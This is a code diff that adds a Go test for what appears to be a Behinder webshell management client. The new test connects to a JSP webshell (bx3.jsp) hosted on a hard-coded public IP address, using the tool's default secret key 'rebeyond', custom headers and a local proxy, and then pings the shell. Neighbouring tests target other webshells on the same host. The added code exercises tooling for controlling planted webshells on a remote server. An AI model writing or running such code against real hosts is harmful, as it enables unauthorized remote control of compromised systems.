@@ -68,6 +68,27 @@ func TestNewWebJSPShell(t *testing.T) {
 	t.Logf("%s", string(x))
 }
 
+func TestNewWebJSPShell_B3(t *testing.T) {
+
+	url := "http://47.120.44.219:8080/bx3.jsp"
+	testHeaders := map[string]string{
+		"xxx":  "yyy",
+		"go0p": "go0p",
+	}
+	bx, _ := NewBehinderManager(url,
+		SetSecretKey("rebeyond"),
+		SetHeaders(testHeaders),
+		SetShellScript("jsp"),
+		SetProxy("http://127.0.0.1:9999"),
+	)
+	ping, err := bx.Ping()
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	t.Logf("%v", ping)
+}
+
 func TestNewWebASPXShell(t *testing.T) {
 
 	url := "http://47.120.44.219:8087/decrypt.aspx"
